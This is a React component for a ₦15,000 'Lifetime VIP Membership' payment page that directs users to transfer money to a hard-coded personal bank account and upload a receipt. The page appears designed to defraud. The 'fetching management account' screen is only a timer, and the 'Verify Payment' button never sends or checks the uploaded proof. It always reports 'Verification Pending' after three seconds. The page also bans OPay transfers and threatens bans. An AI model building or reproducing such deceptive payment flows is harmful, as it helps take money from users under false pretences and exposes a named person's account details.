
import React, { useState, useEffect } from 'react';
import { Icons } from './Icons';
import { User } from '../types';

interface UpgradePaymentProps {
  userEmail: string;
  onPaymentComplete: () => void;
}

const UpgradePayment: React.FC<UpgradePaymentProps> = ({ userEmail, onPaymentComplete }) => {
  const [status, setStatus] = useState<'idle' | 'loading' | 'failed' | 'success'>('idle');
  const [isFetching, setIsFetching] = useState(true);
  const [showWarning, setShowWarning] = useState(true);
  const [proofFile, setProofFile] = useState<File | null>(null);
  const [copied, setCopied] = useState(false);

  const accountNumber = "3608448400";

  const handleCopy = () => {
    navigator.clipboard.writeText(accountNumber);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  useEffect(() => {
    // Initial fetching state
    const timer = setTimeout(() => {
      setIsFetching(false);
    }, 3000);

    // Warning message interval
    const warningInterval = setInterval(() => {
      setShowWarning(prev => !prev);
      setTimeout(() => setShowWarning(true), 500);
    }, 5000);

    return () => {
      clearTimeout(timer);
      clearInterval(warningInterval);
    };
  }, []);

  const handleVerify = () => {
    if (!proofFile) {
      alert("Please upload payment proof first.");
      return;
    }
    setStatus('loading');

    // Wait for 3 seconds
    setTimeout(() => {
        setStatus('failed');
    }, 3000);
  };

  if (isFetching) {
    return (
      <div className="flex flex-col items-center justify-center min-h-[60vh] space-y-4 animate-in fade-in duration-500">
        <div className="w-16 h-16 border-4 border-black border-t-transparent rounded-full animate-spin"></div>
        <p className="text-black font-black uppercase tracking-widest animate-pulse">fetching management account...</p>
      </div>
    );
  }

  return (
    <div className="px-4 py-6 space-y-6 animate-in fade-in slide-in-from-bottom-4 duration-500 pb-10">
      
      {/* Warning Message */}
      <div className={`bg-red-600 text-white p-3 rounded-xl text-center font-black text-xs uppercase tracking-tighter transition-all duration-500 ${showWarning ? 'opacity-100 scale-100' : 'opacity-50 scale-95'}`}>
        DONT USE OPAY TO PAY FOR VIP ACTIVATION. OTHER BANKS LIKE PALMPAY AND MONIEPOINT E.T.C ARE ALLOWED.
      </div>

      {/* Selected Plan Summary */}
      <div className="bg-white p-4 rounded-xl flex justify-between items-center border border-gray-100 shadow-sm">
        <div>
            <p className="text-xs text-gray-400 font-bold uppercase tracking-wide">Selected Service</p>
            <h3 className="text-lg font-bold text-black">Lifetime VIP Membership</h3>
        </div>
        <div className="text-right">
            <p className="text-lg font-extrabold text-black">₦15,000</p>
            <p className="text-xs text-gray-400">Lifetime</p>
        </div>
      </div>

      {/* Account Details Section */}
      <div className="space-y-4">
        <p className="text-xs font-bold text-gray-400 uppercase tracking-widest ml-1 text-center">Step 1: Transfer to Management Account</p>
        
        <div className="bg-white rounded-2xl p-6 shadow-sm border border-gray-100 space-y-4 relative overflow-hidden">
          <div className="absolute top-0 left-0 w-1.5 h-full bg-black"></div>
          
          <div className="space-y-3">
            <div className="flex justify-between items-center border-b border-gray-50 pb-2">
              <span className="text-xs text-gray-400 uppercase font-bold">Account Number</span>
              <div className="flex items-center space-x-2">
                <span className="text-lg font-black text-black tracking-widest">{accountNumber}</span>
                <button 
                  onClick={handleCopy}
                  className={`p-1.5 rounded-md transition-all ${copied ? 'bg-green-500 text-white' : 'bg-gray-100 text-black hover:bg-gray-200'}`}
                >
                  {copied ? <Icons.Check size={14} /> : <Icons.Copy size={14} />}
                </button>
              </div>
            </div>
            <div className="flex justify-between items-center border-b border-gray-50 pb-2">
              <span className="text-xs text-gray-400 uppercase font-bold">Bank Name</span>
              <span className="text-lg font-black text-black uppercase tracking-tighter">Renmoney</span>
            </div>
            <div className="flex justify-between items-center">
              <span className="text-xs text-gray-400 uppercase font-bold">Account Name</span>
              <span className="text-sm font-black text-black uppercase tracking-tighter">Ohi ABDULSALAM</span>
            </div>
          </div>
          
          <div className="bg-gray-50 p-3 rounded-lg flex items-start space-x-2">
            <Icons.AlertTriangle size={16} className="text-gray-400 flex-shrink-0 mt-0.5" />
            <p className="text-[10px] text-gray-400 leading-tight font-medium uppercase">
              Ensure you pay exactly ₦15,000 for VIP activation. Transfers from OPay are strictly prohibited.
            </p>
          </div>
        </div>
      </div>

      {/* Proof Upload Section */}
      <div className="space-y-4">
        <p className="text-xs font-bold text-gray-400 uppercase tracking-widest ml-1 text-center">Step 2: Upload Payment Proof</p>
        
        <div className="relative">
          <input 
            type="file" 
            accept="image/*"
            onChange={(e) => setProofFile(e.target.files?.[0] || null)}
            className="hidden" 
            id="proof-upload"
          />
          <label 
            htmlFor="proof-upload"
            className={`w-full py-6 border-2 border-dashed rounded-2xl flex flex-col items-center justify-center space-y-2 cursor-pointer transition-all ${
              proofFile ? 'border-green-500 bg-green-50' : 'border-gray-200 bg-white hover:border-black'
            }`}
          >
            {proofFile ? (
              <>
                <Icons.CheckCircle size={32} className="text-green-500" />
                <span className="text-xs font-bold text-green-500 uppercase tracking-widest">Proof Selected: {proofFile.name}</span>
              </>
            ) : (
              <>
                <Icons.Upload size={32} className="text-gray-300" />
                <span className="text-xs font-bold text-gray-400 uppercase tracking-widest">Click to upload receipt</span>
              </>
            )}
          </label>
        </div>
      </div>

      {/* Status Message */}
      {status === 'failed' && (
          <div className="bg-red-50 p-4 rounded-xl flex items-center justify-center space-x-3 animate-in shake duration-300 border border-red-100">
               <Icons.X className="text-red-500" size={20} />
               <p className="text-sm font-black text-red-500 uppercase">Verification Pending</p>
          </div>
      )}

      {/* VERIFY Button */}
      <div className="space-y-3">
        <p className="text-xs font-bold text-gray-400 uppercase tracking-widest ml-1 text-center">Step 3: Verify VIP Status</p>
        <button 
            onClick={handleVerify}
            disabled={status === 'loading' || status === 'success'}
            className={`w-full py-4 rounded-xl text-white font-black text-lg shadow-lg transition-all flex items-center justify-center space-x-2 ${
                status === 'loading'
                ? 'bg-gray-300 cursor-not-allowed'
                : 'bg-black hover:bg-gray-800 transform active:scale-95'
            }`}
        >
            {status === 'loading' ? <Icons.Sync className="animate-spin" size={20} /> : <Icons.ShieldCheck size={20} />}
            <span className="uppercase tracking-widest">{status === 'loading' ? 'Verifying...' : 'Verify Payment'}</span>
        </button>
      </div>

      <div className="bg-gray-50 p-3 rounded-lg text-center border border-gray-100">
          <p className="text-[10px] text-gray-400 leading-tight uppercase">
            Our admin team will verify your uploaded proof manually. <br/>
            <span className="font-bold">Fake proofs will lead to permanent account ban.</span>
          </p>
      </div>

    </div>
  );
};

export default UpgradePayment;
